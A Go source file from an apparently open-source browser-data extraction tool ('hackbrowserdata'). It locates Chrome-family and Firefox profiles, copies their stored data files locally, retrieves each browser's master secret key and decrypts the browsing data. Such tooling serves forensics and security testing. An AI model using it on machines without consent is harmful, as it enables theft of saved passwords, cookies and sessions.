package hackbrowserdata

import (
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
)

type Browser interface {
	Name() string

	Storage() string

	ProfilePath() string

	KeyFilePath() string

	MasterSecretKey() ([]byte, error)

	GetBrowsingData(item Itemer) (BrowsingData, error)
}

func NewBrowser(browser Browser) (Browser, error) {
	if browser.ProfilePath() != unsupported {
		return browser, nil
	} else {
		return nil, errors.New(unsupported)
	}
}

func NewBrowserList() []Browser {
	var browserList []Browser
	for i := 0; i <= int(Vivaldi); i++ {
		if webkit(i).ProfilePath() != unsupported {
			browserList = append(browserList, webkit(i))
		}
	}
	for i := 0; i <= int(FirefoxESR); i++ {
		if gecko(i).ProfilePath() != unsupported {
			browserList = append(browserList, gecko(i))
		}
	}
	return browserList
}

type (
	// webkit is a browser engine developed by Apple and primarily used in Safari and Chrome browser
	webkit int
	// gecko is a browser engine developed by Mozilla. It is used in the Firefox browser
	gecko int
)

const (
	Chrome webkit = iota + 1
	ChromeBeta
	Chromium
	Edge
	Speed360
	QQ
	Brave
	Opera
	OperaGX
	Vivaldi
)

const (
	Firefox gecko = iota + 1
	FirefoxBeta
	FirefoxDev
	FirefoxNightly
	FirefoxESR
)

const unsupported = "unsupported browser"

func (b webkit) Name() string {
	switch b {
	case Chrome:
		return "Chrome"
	case Chromium:
		return "Chromium"
	case ChromeBeta:
		return "Chrome Beta"
	case Edge:
		return "Microsoft Edge"
	case Speed360:
		return "360speed"
	case QQ:
		return "qq"
	case Brave:
		return "Brave"
	case Opera:
		return "Opera"
	case OperaGX:
		return "OperaGX"
	case Vivaldi:
		return "Vivaldi"
	default:
		return unsupported
	}
}

func (b gecko) Name() string {
	switch b {
	case Firefox:
		return "Firefox"
	case FirefoxBeta:
		return "Firefox Beta"
	case FirefoxDev:
		return "Firefox Dev"
	case FirefoxNightly:
		return "Firefox Nightly"
	case FirefoxESR:
		return "Firefox ESR"
	default:
		return unsupported
	}
}

func (b webkit) GetBrowsingData(itemer Itemer) (BrowsingData, error) {
	p, err := getAbsPath(b.ProfilePath(), itemer.FileName())
	if err != nil {
		return nil, err
	}
	err = copyToLocal(p, filepath.Base(p))
	if err != nil {
		return nil, err
	}
	masterKey, err := b.MasterSecretKey()
	if err != nil {
		return nil, err
	}
	data := itemer.Data()
	err = data.parse(itemer, masterKey)
	if err != nil {
		return nil, err
	}
	err = os.Remove(itemer.FileName())
	if err != nil {
		return nil, err
	}
	return data, nil
}

func (b gecko) GetBrowsingData(itemer Itemer) (BrowsingData, error) {
	p, err := getAbsPath(b.ProfilePath(), itemer.FileName())
	if err != nil {
		return nil, err
	}
	err = copyToLocal(p, filepath.Base(p))
	if err != nil {
		return nil, err
	}
	masterKey, err := b.MasterSecretKey()
	if err != nil {
		return nil, err
	}
	data := itemer.Data()
	err = data.parse(itemer, masterKey)
	if err != nil {
		return nil, err
	}
	err = os.Remove(itemer.FileName())
	if err != nil {
		return nil, err
	}
	return data, nil
}

var (
	ErrWrongSecurityCommand = errors.New("wrong security command")
)

// getAbsPath 获取文件的绝对路径
func getAbsPath(profilePath, file string) (string, error) {
	p, err := filepath.Glob(filepath.Join(profilePath, file))
	if err != nil {
		return "", err
	}
	if len(p) > 0 {
		return p[0], nil
	}
	return "", fmt.Errorf("find %s failed", file)
}

// copyToLocal 用来将文件拷贝到当前目录
func copyToLocal(src, dst string) error {
	locals, _ := filepath.Glob("*")
	for _, v := range locals {
		if v == dst {
			err := os.Remove(dst)
			if err != nil {
				return err
			}
		}
	}
	sourceFile, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(dst, sourceFile, 0777)
	if err != nil {
		return err
	}
	return nil
}
